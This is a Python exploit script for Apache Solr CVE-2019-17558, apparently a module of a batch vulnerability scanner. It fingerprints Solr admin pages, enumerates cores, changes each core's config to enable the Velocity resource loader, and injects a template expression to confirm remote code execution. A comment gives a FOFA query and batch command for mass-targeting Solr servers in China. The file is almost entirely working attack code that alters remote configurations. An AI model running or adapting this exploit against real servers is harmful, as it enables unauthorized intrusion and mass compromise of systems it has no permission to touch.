# coding=utf-8
# @Author   : zpchcbd HG team
# @Time     : 2021-09-10 14:14

from core.data import gLogger
from exploit.scripts import BaseScript
from core.myenums import BugType, BugLevel
from core.request.asynchttp import *


# fofa: "app=\"solr\" && country=\"CN\""
# python batch.py -m exploit.scripts.Apache.Solr.template_rce -fs "app=\"APACHE-Solr\" && country=\"CN\"" -cs

class Script(BaseScript):
    name = 'Apache Solr'

    def __init__(self, target):
        super().__init__()
        # 漏洞目标
        self.target = target
        # 漏洞等级
        self.bug_level = BugLevel.HIGH
        # 类型
        self.bug_type = BugType.RCE
        # 编号
        self.bug_number = 'CVE-2019-17558'
        # 来源
        self.bug_refer = ''
        # 特定路径判断
        self.detect_path_list = ['/solr/', '/']
        # exec
        self.exec_path_list = ['/solr/admin/cores?indexInfo=false&wt=json']
        # priority
        self.priority = 1
        # 相关信息
        self.info = ''

    async def detect(self):
        async with aiohttp.ClientSession() as session:
            for detectPath in self.detect_path_list:
                url = f'http://{self.target}{detectPath}' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}{detectPath}'
                text = await AsyncFetcher.fetch(session=session, url=url, headers=self.headers, timeout=self.req_timeout)
                if text is not None and '<title>Solr Admin</title>' in text:
                    self.flag = True
                    gLogger.myscan_info('[{} {}] {}'.format(self.name, BugType.FINGER, url))
                    return {'name': '{} {}'.format(self.name, BugType.FINGER), 'url': url, 'software': self.name}
        
    async def exec(self):
        async with aiohttp.ClientSession() as session:
            for exec_path in self.exec_path_list:
                url = f'http://{self.target}{exec_path}' if self.target.startswith( ('http:', 'https:')) is False else f'{self.target}{exec_path}'
                async with session.get(url=url, headers=self.headers, timeout=self.req_timeout, verify_ssl=False) as response:
                    text = await response.json()
                    if text is not None:
                        for name in text.get('status', ''):
                            url = f'http://{self.target}/solr/{name}/config' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}/solr/{name}/config'
                            headers = {'Content-Type': 'application/json'}
                            data = '''                                    
                            {
                                "update-queryresponsewriter": {
                                    "startup": "lazy",
                                    "name": "velocity",
                                    "class": "solr.VelocityResponseWriter",
                                    "template.base.dir": "",
                                    "solr.resource.loader.enabled": "true",
                                    "params.resource.loader.enabled": "true"
                                }
                            }
                            '''
                            # 请求开启params.resource.loader.enabled
                            async with session.post(url=url, timeout=self.req_timeout, headers=headers, data=data, verify_ssl=False) as response2:
                                if response2 is not None and response2.status == 200:
                                    ran1 = random.randint(100, 999)
                                    ran2 = random.randint(100, 999)
                                    url = f'http://{self.target}/solr/{name}/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set(%24c%3D{ran1}%20*%20{ran2})%24c' if self.target.startswith(('http:', 'https:')) is False else f'{self.target}/solr/{name}/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set(%24c%3D{ran1}%20*%20{ran2})%24c'
                                    async with session.get(url=url, timeout=self.req_timeout, allow_redirects=False, verify_ssl=False) as response3:
                                        text3 = await response3.text()
                                        if str(ran1 * ran2) in text3:
                                            gLogger.myscan_info('[{} {}] {}'.format(self.name, self.bug_type, url))
                                            return {'name': '{} {}'.format(self.name, self.bug_type), 'url': url, 'software': self.name}
